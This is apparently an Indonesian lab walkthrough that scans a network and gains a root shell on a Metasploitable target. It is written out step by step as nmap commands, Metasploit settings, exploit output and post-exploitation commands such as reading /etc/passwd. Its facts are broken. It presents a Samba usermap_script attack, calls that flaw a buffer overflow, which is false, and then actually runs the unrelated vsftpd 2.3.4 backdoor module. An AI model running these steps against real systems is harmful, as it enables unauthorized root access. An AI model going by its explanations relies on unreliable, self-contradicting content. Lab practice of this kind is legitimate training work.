# Introduction

**Samba** adalah seperangkat program sumber terbuka (_open source_) yang memungkinkan sistem Linux/Unix berinteraksi dengan jaringan yang **berbasis pada protokol SMB/CIFS** (_Server Message Block/Common Internet File System_), yang merupakan protokol standar untuk berbagi file dan printer di lingkungan Windows.

Secara sederhana, Samba bertindak sebagai "jembatan" atau "penerjemah" yang memungkinkan komputer Linux untuk berbagi file dan printer dengan komputer Windows seolah-olah komputer Linux tersebut adalah server Windows asli.

Kerentanan Samba _usermap_script_ adalah cacat _buffer overflow_ yang memungkinkan penyerang untuk mengeksekusi perintah dengan hak akses root tanpa otentikasi. Ini adalah salah satu kerentanan yang paling dicari karena dampaknya yang parah.

Apa itu **_Buffer Overflow_**? Ini adalah kondisi di mana sebuah program mencoba menulis data lebih banyak ke dalam suatu area memori (_buffer_) daripada yang bisa ditampung. Akibatnya, data tersebut meluber ke area memori di sekitarnya, yang bisa dimanfaatkan oleh penyerang untuk menyuntikkan dan menjalankan kode berbahaya mereka sendiri.

**1. _Reconnaissence_**

- Analisis jaringan yang sedang dipakai untuk mengetahui IP yang digunakan

```
ifconfig
```
- Memindai seluruh jaringan internal yang saling terhubung untuk mencari target
```
nmap -sn <ip_range>

Ex. nmap -sn 192.168.1.0/24   //scanning the whole connected divices
```
**2. _Scanning and Enumeration_**

Memindai port samba, yaitu 445 (SMB over TCP) dan 139 (NetBIOS-SSN) pada IP target
```
nmap -p 445,139 --script=smb-os-discovery <ip_metasploitable>
```

```

```
**3. _Gaining Access (Exploitation)_**
- Menjalankan Metasploit Framework
```
msfconsole
```
- Mencari modul eksploitasi yang sesuai dengan kerentanan yang ditemukan
```
search vsftpd 2.3.4
```

```
Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution

```
- Memilih dan mengatur eksploitasi
```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <ip_metasploitable>
set LHOST <ip_kali_linux>
```
- Cek _requirement_, pastikan tidak ada yang kurang atau terlewat
```
show options
```
- Jika sudah lengkap, jalankan serangan
```
exploit
```

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] 192.168.22.64:21 - The port used by the backdoor bind listener is already open
[+] 192.168.22.64:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.22.63:33787 -> 192.168.22.64:6200) at 2025-08-21 07:03:24 -0400

```
**4. _Maintaining accsess dan Post exploitation_**
- Verifikasi user atau akses root
```
whoami
```
- Eksplorasi sistem
```
ls -l      //melihat list file dan direktory
```
```
uname -a   //melihat versi kernel dan informasi sistem
```
```
cat /etc/passwd  //melihat daftar user
```
